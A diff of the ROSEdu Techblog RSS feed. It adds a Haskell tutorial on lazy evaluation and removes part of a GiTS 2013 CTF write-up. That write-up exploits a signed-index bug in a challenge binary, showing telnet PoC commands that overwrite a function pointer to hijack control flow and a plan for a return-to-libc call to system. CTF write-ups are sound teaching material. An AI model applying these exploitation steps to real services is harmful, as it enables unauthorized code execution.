@@ -6,8 +6,135 @@
         <description><![CDATA[ROSEdu Techblog]]></description>
         <atom:link href="http://techblog.rosedu.org/rss.xml" rel="self"
                    type="application/rss+xml" />
-        <lastBuildDate>Sun, 02 Feb 2014 00:00:00 UT</lastBuildDate>
+        <lastBuildDate>Sun, 02 Mar 2014 00:00:00 UT</lastBuildDate>
         <item>
+    <title>A superficial exploration of Haskell, part 2: Lazy by default</title>
+    <link>http://techblog.rosedu.org/haskell-part2.html</link>
+    <description><![CDATA[<div class="unit-inner unit-article-inner">
+  <div class="content">
+    <div class="bd">
+      <header>
+        <div class="unit-head">
+          <div class="unit-inner unit-head-inner">
+            <h1 class="h2 entry-title">
+              <a class="post_title" href="/haskell-part2.html" title="A superficial exploration of Haskell, part 2: Lazy by default">A superficial exploration of Haskell, part 2: Lazy by default</a>
+            </h1>
+          </div><!-- unit-inner -->
+        </div><!-- unit-head -->
+      </header>
+
+      <span class="date">
+      <span class="published">Published on March  2, 2014</span>
+      by
+      <span class="author">Dan Șerban</span>
+      </span>
+
+      <br/>
+      <span class="meta">
+        Tagged:
+        <span class="tags"><a href="/tags/haskell.html">haskell</a></span>
+      </span>
+
+      <p>Haskell uses lazy evaluation by default, but what does that mean exactly?</p>
+<p>We’re going to state the abstract definition of laziness, behold its nonsensical beauty for a few seconds, and then conclude that a concrete example is necessary in order to understand the concept:</p>
+<blockquote>
+<p>Laziness is the separation of equation from execution.</p>
+</blockquote>
+<!--more-->
+
+<p>Before we look at an example, let me remind you of a bit of syntactic sugar that Haskell provides in order to quickly define a list of successive integers:</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: [<span class="dv">20</span><span class="fu">..</span><span class="dv">70</span>]
+[<span class="dv">20</span>,<span class="dv">21</span>,<span class="dv">22</span>,<span class="dv">23</span>,<span class="dv">24</span>,<span class="dv">25</span>,<span class="dv">26</span>,<span class="dv">27</span>,<span class="dv">28</span>,<span class="dv">29</span>,<span class="dv">30</span>,<span class="dv">31</span>,<span class="dv">32</span>,<span class="dv">33</span>,<span class="dv">34</span>,<span class="dv">35</span>,<span class="dv">36</span>,<span class="dv">37</span>,<span class="dv">38</span>,<span class="dv">39</span>,<span class="dv">40</span>,<span class="dv">41</span>,<span class="dv">42</span>,<span class="dv">43</span>,<span class="dv">44</span>,<span class="dv">45</span>,<span class="dv">46</span>,<span class="dv">47</span>,<span class="dv">48</span>,<span class="dv">49</span>,<span class="dv">50</span>,<span class="dv">51</span>,<span class="dv">52</span>,<span class="dv">53</span>,<span class="dv">54</span>,<span class="dv">55</span>,<span class="dv">56</span>,<span class="dv">57</span>,<span class="dv">58</span>,<span class="dv">59</span>,<span class="dv">60</span>,<span class="dv">61</span>,<span class="dv">62</span>,<span class="dv">63</span>,<span class="dv">64</span>,<span class="dv">65</span>,<span class="dv">66</span>,<span class="dv">67</span>,<span class="dv">68</span>,<span class="dv">69</span>,<span class="dv">70</span>]</code></pre>
+<p>As you might remember from <a href="http://techblog.rosedu.org/haskell-part1.html">part 1</a>, <code>λ:</code> is my custom GHCi prompt, so we’re effectively looking at the result of how GHCi interprets the notation <code>[20..70]</code>.</p>
+<p>OK then. To start, let’s define two lists:</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: <span class="kw">let</span> list1 <span class="fu">=</span> [<span class="dv">20</span><span class="fu">..</span><span class="dv">70</span>]
+λ: <span class="kw">let</span> list2 <span class="fu">=</span> map (<span class="fu">+</span><span class="dv">1</span>) list1</code></pre>
+<p>At this point you might be thinking “Oh look, <code>list1</code> is the enumeration of all integers between 20 and 70, and <code>list2</code> is the enumeration of all integers between 21 and 71”.</p>
+<p><strong>Well, no.</strong> Not yet, at least.</p>
+<p>GHCi provides a command called <code>:sprint</code> that allows us to take a peek at how far along the evaluation of a given expression has progressed.</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: <span class="fu">:</span>sprint list1
+list1 <span class="fu">=</span> _
+λ: <span class="fu">:</span>sprint list2
+list2 <span class="fu">=</span> _</code></pre>
+<p>So what <code>:sprint</code> is telling us in the above snippet is that both <code>list1</code> and <code>list2</code> are unevaluated at this point. To establish some terminology, an underscore in the context of <code>:sprint</code> output represents a <strong>thunk</strong>. Formally defined, a thunk is an expression that hasn’t yet been evaluated. You may think of it as a value wrapped in a function of zero arguments. When the function is called, the value springs into existence.</p>
+<p>We are now going to ask increasingly “intrusive” questions about <code>list2</code> and then each step along the way examine what has been evaluated and what hasn’t.</p>
+<p>The simplest and least intrusive question we can ask about a list is whether or not it’s empty.</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: null list2
+<span class="dt">False</span>
+λ: <span class="fu">:</span>sprint list1
+list1 <span class="fu">=</span> <span class="dv">20</span> <span class="fu">:</span> _
+λ: <span class="fu">:</span>sprint list2
+list2 <span class="fu">=</span> _ <span class="fu">:</span> _</code></pre>
+<p>In order to answer that question, GHCi needs to know whether or not the first element exists, and as a result, <code>list2</code> is no longer unevaluated, it is now partially evaluated. GHCi now knows something about the structure of <code>list2</code> - it knows that it consists of something “consed onto” (prepended to) something else. In the next round, that “something” will turn out to be the value <code>21</code>, but for right now this fact is irrelevant to the process of answering the question “is <code>list2</code> empty”. However, we notice the value <code>20</code> is fully evaluated as the head of <code>list1</code> - this particular evaluation was necessary in order to construct the thunk <code>(+1) 20</code>.</p>
+<p>Next, we ask for the first element of <code>list2</code>:</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: head list2
+<span class="dv">21</span>
+λ: <span class="fu">:</span>sprint list1
+list1 <span class="fu">=</span> <span class="dv">20</span> <span class="fu">:</span> _
+λ: <span class="fu">:</span>sprint list2
+list2 <span class="fu">=</span> <span class="dv">21</span> <span class="fu">:</span> _</code></pre>
+<p>We notice that the expression <code>(+1) 20</code> mentioned above is now fully evaluated and therefore no longer a thunk.</p>
+<p>Next, let’s ask for the first 5 elements of <code>list2</code>:</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: take <span class="dv">5</span> list2
+[<span class="dv">21</span>,<span class="dv">22</span>,<span class="dv">23</span>,<span class="dv">24</span>,<span class="dv">25</span>]
+λ: <span class="fu">:</span>sprint list1
+list1 <span class="fu">=</span> <span class="dv">20</span> <span class="fu">:</span> <span class="dv">21</span> <span class="fu">:</span> <span class="dv">22</span> <span class="fu">:</span> <span class="dv">23</span> <span class="fu">:</span> <span class="dv">24</span> <span class="fu">:</span> _
+λ: <span class="fu">:</span>sprint list2
+list2 <span class="fu">=</span> <span class="dv">21</span> <span class="fu">:</span> <span class="dv">22</span> <span class="fu">:</span> <span class="dv">23</span> <span class="fu">:</span> <span class="dv">24</span> <span class="fu">:</span> <span class="dv">25</span> <span class="fu">:</span> _</code></pre>
+<p>Next, let’s ask for the 18th element of <code>list2</code>:</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: list2 <span class="fu">!!</span> <span class="dv">17</span>
+<span class="dv">38</span>
+λ: <span class="fu">:</span>sprint list1
+list1 <span class="fu">=</span> <span class="dv">20</span> <span class="fu">:</span> <span class="dv">21</span> <span class="fu">:</span> <span class="dv">22</span> <span class="fu">:</span> <span class="dv">23</span> <span class="fu">:</span> <span class="dv">24</span> <span class="fu">:</span> <span class="dv">25</span> <span class="fu">:</span> <span class="dv">26</span> <span class="fu">:</span> <span class="dv">27</span> <span class="fu">:</span> <span class="dv">28</span> <span class="fu">:</span> <span class="dv">29</span> <span class="fu">:</span>
+        <span class="dv">30</span> <span class="fu">:</span> <span class="dv">31</span> <span class="fu">:</span> <span class="dv">32</span> <span class="fu">:</span> <span class="dv">33</span> <span class="fu">:</span> <span class="dv">34</span> <span class="fu">:</span> <span class="dv">35</span> <span class="fu">:</span> <span class="dv">36</span> <span class="fu">:</span> <span class="dv">37</span> <span class="fu">:</span> _
+λ: <span class="fu">:</span>sprint list2
+list2 <span class="fu">=</span> <span class="dv">21</span> <span class="fu">:</span> <span class="dv">22</span> <span class="fu">:</span> <span class="dv">23</span> <span class="fu">:</span> <span class="dv">24</span> <span class="fu">:</span> <span class="dv">25</span> <span class="fu">:</span> _ <span class="fu">:</span> _ <span class="fu">:</span> _ <span class="fu">:</span> _ <span class="fu">:</span> _ <span class="fu">:</span>
+        _ <span class="fu">:</span> _ <span class="fu">:</span> _ <span class="fu">:</span> _ <span class="fu">:</span> _ <span class="fu">:</span> _ <span class="fu">:</span> _ <span class="fu">:</span> <span class="dv">38</span> <span class="fu">:</span> _</code></pre>
+<p>Now this is interesting.</p>
+<p>Elements from the 6th to the 17th are fully evaluated in <code>list1</code> but unevaluated in <code>list2</code>. Because of how <code>list1</code> is defined, it is going to be evaluated in small, close-proximity increments from left to right. But all values in <code>list2</code> are evaluated by applying a transformation on elements in the corresponding positions in <code>list1</code>. That is why we are starting to see gaps in <code>list2</code>.</p>
+<p>This example really drives home the essence of lazy evaluation. By default, Haskell will evaluate as little as possible, as late as possible. This is in contrast to traditional, imperative programming languages which evaluate as much as possible, as soon as possible.</p>
+<p>Next, let’s ask for the length of <code>list2</code>:</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: length list2
+<span class="dv">51</span>
+λ: <span class="fu">:</span>sprint list1
+list1 <span class="fu">=</span> [<span class="dv">20</span>,<span class="dv">21</span>,<span class="dv">22</span>,<span class="dv">23</span>,<span class="dv">24</span>,<span class="dv">25</span>,<span class="dv">26</span>,<span class="dv">27</span>,<span class="dv">28</span>,<span class="dv">29</span>,
+         <span class="dv">30</span>,<span class="dv">31</span>,<span class="dv">32</span>,<span class="dv">33</span>,<span class="dv">34</span>,<span class="dv">35</span>,<span class="dv">36</span>,<span class="dv">37</span>,<span class="dv">38</span>,<span class="dv">39</span>,
+         <span class="dv">40</span>,<span class="dv">41</span>,<span class="dv">42</span>,<span class="dv">43</span>,<span class="dv">44</span>,<span class="dv">45</span>,<span class="dv">46</span>,<span class="dv">47</span>,<span class="dv">48</span>,<span class="dv">49</span>,
+         <span class="dv">50</span>,<span class="dv">51</span>,<span class="dv">52</span>,<span class="dv">53</span>,<span class="dv">54</span>,<span class="dv">55</span>,<span class="dv">56</span>,<span class="dv">57</span>,<span class="dv">58</span>,<span class="dv">59</span>,
+         <span class="dv">60</span>,<span class="dv">61</span>,<span class="dv">62</span>,<span class="dv">63</span>,<span class="dv">64</span>,<span class="dv">65</span>,<span class="dv">66</span>,<span class="dv">67</span>,<span class="dv">68</span>,<span class="dv">69</span>,<span class="dv">70</span>]
+λ: <span class="fu">:</span>sprint list2
+list2 <span class="fu">=</span> [<span class="dv">21</span>,<span class="dv">22</span>,<span class="dv">23</span>,<span class="dv">24</span>,<span class="dv">25</span>,_,_,_,_,_,
+         _,_,_,_,_,_,_,<span class="dv">38</span>,_,_,
+         _,_,_,_,_,_,_,_,_,_,
+         _,_,_,_,_,_,_,_,_,_,
+         _,_,_,_,_,_,_,_,_,_,_]</code></pre>
+<p>At this point, <code>list1</code> is fully evaluated because there are no two ways around it - in order to compute the length of <code>list2</code>, GHCi needs to keep track of each and every one of its thunks, therefore it needs to generate the entire “spine” of the list. The process of generating the thunks <code>(+1) 25</code> through <code>(+1) 70</code> will require all elements of <code>list1</code> to be fully evaluated.</p>
+<p>Finally, there is only one thing left for us to do such that <code>list2</code> is fully evaluated too - compute the sum of its elements:</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell">λ: sum list2
+<span class="dv">2346</span>
+λ: <span class="fu">:</span>sprint list2
+list2 <span class="fu">=</span> [<span class="dv">21</span>,<span class="dv">22</span>,<span class="dv">23</span>,<span class="dv">24</span>,<span class="dv">25</span>,<span class="dv">26</span>,<span class="dv">27</span>,<span class="dv">28</span>,<span class="dv">29</span>,<span class="dv">30</span>,
+         <span class="dv">31</span>,<span class="dv">32</span>,<span class="dv">33</span>,<span class="dv">34</span>,<span class="dv">35</span>,<span class="dv">36</span>,<span class="dv">37</span>,<span class="dv">38</span>,<span class="dv">39</span>,<span class="dv">40</span>,
+         <span class="dv">41</span>,<span class="dv">42</span>,<span class="dv">43</span>,<span class="dv">44</span>,<span class="dv">45</span>,<span class="dv">46</span>,<span class="dv">47</span>,<span class="dv">48</span>,<span class="dv">49</span>,<span class="dv">50</span>,
+         <span class="dv">51</span>,<span class="dv">52</span>,<span class="dv">53</span>,<span class="dv">54</span>,<span class="dv">55</span>,<span class="dv">56</span>,<span class="dv">57</span>,<span class="dv">58</span>,<span class="dv">59</span>,<span class="dv">60</span>,
+         <span class="dv">61</span>,<span class="dv">62</span>,<span class="dv">63</span>,<span class="dv">64</span>,<span class="dv">65</span>,<span class="dv">66</span>,<span class="dv">67</span>,<span class="dv">68</span>,<span class="dv">69</span>,<span class="dv">70</span>,<span class="dv">71</span>]</code></pre>
+<section id="conclusion" class="level3">
+<h3>Conclusion</h3>
+<p>Laziness can be a tremendously helpful device for designing Haskell programs that run in constant space and feature a clean separation of pure code vs. side-effecting code. However, care must be taken to avoid what is known as “space leaks”, which we are going to cover in the next instalment of this series.</p>
+</section>
+<section id="editorial-note" class="level3">
+<h3>Editorial note</h3>
+<p>This blog post was inspired by chapter 2 of Simon Marlow’s excellent book <a href="http://chimera.labs.oreilly.com/books/1230000000929">“Parallel and Concurrent Programming in Haskell”</a> which is available both in e-book format as well as free of charge online.</p>
+</section>
+
+    </div>
+  </div>
+</div>
+]]></description>
+    <pubDate>Sun, 02 Mar 2014 00:00:00 UT</pubDate>
+    <guid>http://techblog.rosedu.org/haskell-part2.html</guid>
+</item>
+<item>
     <title>Unix standards and implementations. Unix portability</title>
     <link>http://techblog.rosedu.org/unix-standards.html</link>
     <description><![CDATA[<div class="unit-inner unit-article-inner">
@@ -1853,410 +1980,6 @@ include base.mk</code></pre>
 ]]></description>
     <pubDate>Mon, 18 Mar 2013 00:00:00 UT</pubDate>
     <guid>http://techblog.rosedu.org/git-is-the-answer-1.html</guid>
-</item>
-<item>
-    <title>GiTS 2013 CTF -- return-to-libc -- pwnable 250</title>
-    <link>http://techblog.rosedu.org/ctf-return-to-libc.html</link>
-    <description><![CDATA[<div class="unit-inner unit-article-inner">
-  <div class="content">
-    <div class="bd">
-      <header>
-        <div class="unit-head">
-          <div class="unit-inner unit-head-inner">
-            <h1 class="h2 entry-title">
-              <a class="post_title" href="/ctf-return-to-libc.html" title="GiTS 2013 CTF -- return-to-libc -- pwnable 250">GiTS 2013 CTF -- return-to-libc -- pwnable 250</a>
-            </h1>
-          </div><!-- unit-inner -->
-        </div><!-- unit-head -->
-      </header>
-
-      <span class="date">
-      <span class="published">Published on February 19, 2013</span>
-      by
-      <span class="author">Lucian Cojocar</span>
-      </span>
-
-      <br/>
-      <span class="meta">
-        Tagged:
-        <span class="tags"><a href="/tags/exploit.html">exploit</a>, <a href="/tags/ctf.html">ctf</a>, <a href="/tags/return-to-libc.html">return-to-libc</a>, <a href="/tags/strace.html">strace</a>, <a href="/tags/debugging.html">debugging</a>, <a href="/tags/gdb.html">gdb</a>, <a href="/tags/write-up.html">write-up</a></span>
-      </span>
-
-      <section id="introduction" class="level1">
-<h1>Introduction</h1>
-<p>This is a write-up for Pwnable 250 level from <a href="http://ghostintheshellcode.com/" title="Ghost in the Shellcode CTF">Ghost in the Shellcode</a> capture the flag competition. Basically a return-to-libc attack will be described; we will also describe the steps for solving the mentioned CTF level using the <a href="res/back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f" title="Vulnerable binary">original binary</a> from the competition.</p>
-<!--more-->
-
-
-</section>
-<section id="hello-binary" class="level1">
-<h1>Hello binary!</h1>
-<p>Let’s start by inspecting the binary.</p>
-<ul>
-<li><p>32bit dynamically linked binary</p>
-<pre><code>$ file ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f: ELF 32-bit LSB executable, ...</code></pre></li>
-<li><p>it waits for connections on port 31337</p>
-<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-	[...]
-setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
-bind(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr(&quot;0.0.0.0&quot;)}, 16) = 0
-listen(3, 20)                           = 0
-accept(3, </code></pre></li>
-</ul>
-<p><code>SO_REUSEADDR</code> is used, just for <em>easy</em> debugging ;-) - it allows other sockets to <code>bind()</code> this port; no more getting the annoying error <em>Address already in use</em> after the server crashes.</p>
-<pre><code>$ telnet localhost 31337
-Trying ::1...
-Trying 127.0.0.1...
-Connected to localhost.
-Escape character is &#39;^]&#39;.
-Connection closed by foreign host.
-$</code></pre>
-<p>It immediately drops connection.</p>
-<p>Let’s have a look at what happens when we are connecting to it.</p>
-<pre><code>$ ltrace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-[...]
-[pid 4359] accept(3, 0, 0, 0x697a0002, 1)                                           = 4
-[pid 4359] fork()                                                                   = 4361
-[pid 4359] close(4)                                                                 = 0
-[pid 4359] accept(3, 0, 0, 0x697a0002, 1 &lt;unfinished ...&gt;
-[pid 4361] &lt;... fork resumed&gt; )                                                     = 0
-[pid 4361] getpwnam(&quot;back2skool&quot;)                                                   = NULL
-[pid 4361] err(-1, 0x804997b, 0x80499b8, 0, 0back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f:
-Failed to find user back2skool: Success
- &lt;unfinished ...&gt;
-[pid 4361] +++ exited (status 255) +++</code></pre>
-<p>In short, <code>getpwnam</code> fails, and the forked child exits. It also prints a conclusive error - the user <code>back2skool</code> is required.</p>
-<p>Usually, the <em>first</em> step, when trying to solve a remote challenge is to debug it locally. Of course this is possible as long as we can run the application ourselves.</p>
-<p>After we setup the user we can see the following output when connecting:</p>
-<pre><code>$ telnet localhost 31337
-Trying ::1...
-Trying 127.0.0.1...
-Connected to localhost.
-Escape character is &#39;^]&#39;.
-    __  ___      __  __   _____
-   /  |/  /___ _/ /_/ /_ / ___/___  ______   __ v0.01
-  / /|_/ / __ `/ __/ __ \\__ \/ _ \/ ___/ | / /
- / /  / / /_/ / /_/ / / /__/ /  __/ /   | |/ /
-/_/  /_/\__,_/\__/_/ /_/____/\___/_/    |___/
-===============================================
-Welcome to MathServ! The one-stop shop for all your arithmetic needs.
-This program was written by a team of fresh CS graduates using only the most
-agile of spiraling waterfall development methods, so rest assured there are
-no bugs here!
-
-Your current workspace is comprised of a 10-element table initialized as:
-{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
-
-Commands:
-	read	Read value from given index in table
-	write	Write value to given index in table
-	func1	Change operation to addition
-	func2	Change operation to multiplication
-	math	Perform math operation on table
-	exit	Quit and disconnect
-exit
-Exiting program!
-Connection closed by foreign host.
-$</code></pre>
-</section>
-<section id="the-vulnerability" class="level1">
-<h1>The vulnerability</h1>
-<section id="high-level" class="level4">
-<h4>High-level</h4>
-<p>The output of the program is self-explanatory. Let’s try some commands.</p>
-<pre><code>$ telnet localhost 31337
-read
-Input position to read from:
-3</code></pre>
-<p>Nothing special.</p>
-<pre><code>Input position to read from:
-10
-Value at position 10: 134519224</code></pre>
-<p>We can read <strong>past</strong> our table!</p>
-<pre><code>Input position to read from:
--200
-Value at position -200: 0</code></pre>
-<p>We can read <strong>below</strong> our table!</p>
-<pre><code>read
-Input position to read from:
-90000
-Connection closed by foreign host.</code></pre>
-<p>The program received <code>SIGSEGV</code> and the socket was closed. At least we can crash the program; in fact we are only crashing the child that has been spawned to handle our connection.</p>
-<p>But what about write?</p>
-<pre><code>$ telnet localhost 31337
-write
-Input position to write to:
-0
-Input numeric value to write:
-1
-Value at position 0: 1</code></pre>
-<p>Nothing special.</p>
-<pre><code>write
-Input position to write to:
-10
-Table index too large!</code></pre>
-<p>Bummer, we cannot <strong>write past</strong> our table!</p>
-<pre><code>write
-Input position to write to:
--1
-Input numeric value to write:
-42
-Value at position -1: 42
-write
-Input position to write to:
--10000 
-Input numeric value to write:
-999
-Connection closed by foreign host.</code></pre>
-<p>Heh, we can <strong>write below</strong> our table!</p>
-</section>
-<section id="low-level" class="level4">
-<h4>Low-level</h4>
-<p>The assembly code, responsible for checking the indices can be viewed below. <img style="float:center" src='/images/ida-atoi-read.png' alt="Read - atoi"/></p>
-<p>As you can <em>not</em> see, there is no check code for the index when we’re doing a <em>read</em> operation.</p>
-<p><img style="float:center" src='/images/ida-atoi-write.png' alt="Write - atoi"/></p>
-<p>For the <em>write</em> operation there is checking using the instruction <code>jle</code>. But <code>jle</code> instruction is used for comparing <em>signed</em> integers. The instruction <code>jbe</code> should be used in this case which compares <em>unsigned</em> integers. You can find more on this <a href="http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Jump_if_Less">wiki article</a>. Probably the original code looks something like this:</p>
-<pre class="sourceCode cpp"><code class="sourceCode cpp"><span class="dt">int</span> i;
-i = atoi(str);
-<span class="kw">if</span> (i &gt; <span class="dv">9</span>) {
-	error();
-	exit();
-}
-do_stuff;</code></pre>
-<p>One way to correct the above code is to have an unsigned comparison or check for negative values. Both would work in this case, but then we couldn’t solve this level :-).</p>
-<p>In short, the <strong>index checking</strong> is <strong>broken</strong>. We can use any index for the <strong>read</strong> operation and for the <strong>write</strong> only negative indices. When you can write anything to any address of a program, the rest is just implementation.</p>
-</section>
-</section>
-<section id="the-exploit" class="level1">
-<h1>The exploit</h1>
-<p>As explained in the previous section we can modify <em>almost</em> any address from our vulnerable program. In order to choose a right way to exploit the vulnerability, we should gather more information about the environment.</p>
-<section id="do-we-have-any-rwx-place-to-store-the-payload" class="level3">
-<h3>Do we have any RWX place to store the payload?</h3>
-<pre><code>$ readelf -e ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f 
-ELF Header:
-  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
-[...]
-
-Program Headers:
-  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
-  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
-  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
-      [Requesting program interpreter: /lib/ld-linux.so.2]
-  LOAD           0x000000 0x08048000 0x08048000 0x022a8 0x022a8 R E 0x1000
-  LOAD           0x002e68 0x0804be68 0x0804be68 0x00204 0x00214 RW  0x1000
-  DYNAMIC        0x002e7c 0x0804be7c 0x0804be7c 0x000d8 0x000d8 RW  0x4
-  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
-  GNU_EH_FRAME   0x001e94 0x08049e94 0x08049e94 0x000c4 0x000c4 R   0x4
-  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
-  GNU_RELRO      0x002e68 0x0804be68 0x0804be68 0x00198 0x00198 R   0x1
-[...]</code></pre>
-<p>The short answer is <strong>no</strong> - there is no <code>RWE</code> section in the binary. We cannot modify a memory that will be executed later. Maybe we can put our exploit in some region and then make this region executable. This means that we should be able to call <code>mprotect</code> or <code>mmap</code>. But we’ll have to do this, without injecting code, but only by changing non-executable data - e.g. stack values. One idea is to use a <a href="http://en.wikipedia.org/wiki/Return-oriented_programming">return-oriented-programming (ROP) approach</a>, but as you will see in a future section, because our program doesn’t use <code>mprotect</code> or <code>mmap</code> (from libc), calling those functions means that we will have to figure out the offsets of those functions in libc first - if we do this, we can have a more straightforward approach by calling <code>system</code> function directly.</p>
-</section>
-<section id="is-aslr-enabled" class="level3">
-<h3>Is ASLR enabled?</h3>
-<p>It is safe to assume that <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization#Linux">ASLR</a> is enabled. But because we will use some sort of ROP, we don’t care too much about this right now.</p>
-</section>
-<section id="where-shall-we-write" class="level3">
-<h3>Where shall we write?</h3>
-<p>In order to modify the flow control of the program by only changing non-executable memory, we will have to find an <strong>indirect jump</strong> and change the value from that specific address. <a href="http://althing.cs.dartmouth.edu/secref/resources/plt-got.txt">GOT</a> is the starting point for this.</p>
-<p>The idea that comes to our mind is: we will write (override) an address of function which is called later from the GOT. The GOT table is always at the same place in the memory (it resides in the binary) but recall, that we’re writing relatively to a buffer (the workspace table). So the next question that comes in our mind is:</p>
-</section>
-<section id="do-we-know-the-address-of-the-buffer" class="level3">
-<h3>Do we know the address of the buffer?</h3>
-<p>There are three cases where the buffer might be located:</p>
-<ul>
-<li>on the stack. If ASLR is enabled, figuring out its address can be done by reading an old <code>%ebp</code>, which is possible because we can read parts of the memory relative to the buffer address;</li>
-<li>on the heap. This is harder to get. But if our buffer is on the heap, and we can alter structures that are used internally by the malloc function (and we can, because the negative offset write) there is a way of exploiting. We can do something like in the case of <a href="https://www.owasp.org/index.php/Double_Free">double-free vulnerability</a> - but it would be a tedious job;</li>
-<li>declared global (<code>.bss</code> or <code>.data</code> section). The address of the buffer is the same as in the binary, no runtime hazards.</li>
-</ul>
-<p>Probably because pwn250 is <strong>not</strong> the hardest level, the buffer is in the <code>.data</code> section.</p>
-<p><img style="float:center" src='/images/ida-values.png' alt="Values buffer"/></p>
-<p>Because our buffer is in <code>.data</code> section and we can use negative indices for read and write, we have a <strong>good</strong> control over the memory <strong>below</strong> our buffer. Moreover, you can see in the <a href="https://www.hex-rays.com/products/ida/index.shtml">IDA</a> screenshot above, that there’s a <code>math</code> variable. The program is capable of switching from one operation (addition) to another one (multiplication) it does so by changing a pointer to a function. The pointer is in the <code>.bss</code> section.</p>
-<p><img style="float:center" src='/images/ida-indirect-jump.png' alt="Indirect jump via math_ptr"/></p>
-<p>I know at this point, one might argue that the authors of the program used this pointer to facilitate the problem solving - it’s true I wouldn’t argue against this - it’s just a game.</p>
-<p>So <strong>let’s state our idea</strong>: we will override a pointer to a function which is called later; the function will be called whenever the <code>math</code> function is called.</p>
-</section>
-<section id="first-poc" class="level2">
-<h2>First <a href="http://en.wikipedia.org/wiki/Proof_of_concept">PoC</a></h2>
-<pre><code>$ telnet localhost 31337
-[...]
-math
-You haven&#39;t set a mode yet!
-func1
-Setting mode to ADDITION
-write
-Input position to write to:
--2147483634
-Input numeric value to write:
-286331153
-Value at position -2147483634: 286331153
-math
-Connection closed by foreign host.
-$</code></pre>
-<p>Meanwhile, back at the castle.</p>
-<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-[...]
-[pid  4710] recv(4, &quot;\n&quot;, 1, 0)         = 1
-[pid  4710] send(4, &quot;Value at position -2147483634: 2&quot;..., 41, 0) = 41
-[pid  4710] read(4, &quot;m&quot;, 1)             = 1
-[pid  4710] read(4, &quot;a&quot;, 1)             = 1
-[pid  4710] read(4, &quot;t&quot;, 1)             = 1
-[pid  4710] read(4, &quot;h&quot;, 1)             = 1
-[pid  4710] read(4, &quot;\r&quot;, 1)            = 1
-[pid  4710] read(4, &quot;\n&quot;, 1)            = 1
-[pid  4710] --- SIGSEGV (Segmentation fault) @ 0 (0) ---
-Process 4710 detached
-$</code></pre>
-<p>OK, we’ve got our segmentation fault. Let’s see what was the last instruction pointer.</p>
-<pre><code>$ gdb ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f /home/back2skool/core 
-[...]
-Core was generated by `./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f&#39;.
-Program terminated with signal 11, Segmentation fault.
-#0  0x11111111 in ?? ()
-(gdb) </code></pre>
-<p>Neat! But what are those numbers? We wrote at position <strong>-2147483634</strong> value <strong>286331153</strong>. The second number is the instruction pointer at which we want to jump with the <code>math</code> function. The first number is computed as follows</p>
-<ul>
-<li>the base of our buffer (values) is at a fixed address 0x804c040</li>
-<li>the address at which we want to write is 0x804c078</li>
-<li>we need to write at position values+0x38</li>
-<li>giving a positive index (0x38/4) will give an upper bound error</li>
-<li>the negative index is -(2^31 - (0x38/4)) == <strong>-2147483634</strong></li>
-<li>you can test this by computing 2^33 + 0x804c040-4*(2^31 - (0x38/4)) - because of the way the buffer is addressed (4 bytes values, <a href="http://en.wikipedia.org/wiki/Addressing_mode#Scaled">scaled addressing</a>) the overflow is ignored and the index value <em>wraps</em> around. We need to do <em>wrap</em> around only when we try to access a value above the base address of the vector.</li>
-</ul>
-<p>The instruction pointer is the value that we wrote, 0x11111111 in decimal is <strong>286331153</strong>, so we’ve managed to modify the flow of the program by doing a write, and we’ve managed to do so in a predictable way.</p>
-</section>
-<section id="second-poc" class="level2">
-<h2>Second PoC</h2>
-<p>We are in the following state: we’ve managed to make our program to jump at any location. But <strong>where</strong> to jump? Because we don’t have any possibility of injecting code, we should rely on the available code. Available code means, our code and the dynamic libraries code which are mapped in our address space.</p>
-<p>Let’s inspect again our binary to see what is used from shared libraries.</p>
-<pre><code>$ nm -D -u ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f 
-         w __gmon_start__
-         U __libc_start_main U __stack_chk_fail U accept U atoi U bind
-         U chdir U close U err U exit U fork U free U getpwnam U htonl
-         U htons U listen U perror U read U recv U send U setgid
-         U setgroups U setsockopt U setuid U signal U socket U vasprintf
-$ </code></pre>
-<p>Hmm, nothing useful, nothing to execute, nothing to modify the mappings. But hey, if you have access to those functions from libc and because the loader maps the libc to our address space then it means that we have access to other functions from libc, the problem is that we don’t know where they are. A wild <strong>idea appears</strong>, if we knew where one of the function from libc is, we can compute the rest of them by adding some offsets. There are two problems with this idea: <strong>how do we find the offset of a used function</strong> and <strong>how do we compute the offset of an unused function</strong>.</p>
-<ul>
-<li><p>finding the address of a used function is <strong>simple</strong>, we can use the GOT and read the value of the pointer which has been already filled in by the loader. Because of the lazy linking, we only have to be careful to choose a function which has been previously called. We will choose <code>recv</code> for this purpose.</p>
-<pre><code>$ objdump -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  | grep -A2 recv@plt
-08048980 &lt;recv@plt&gt;:
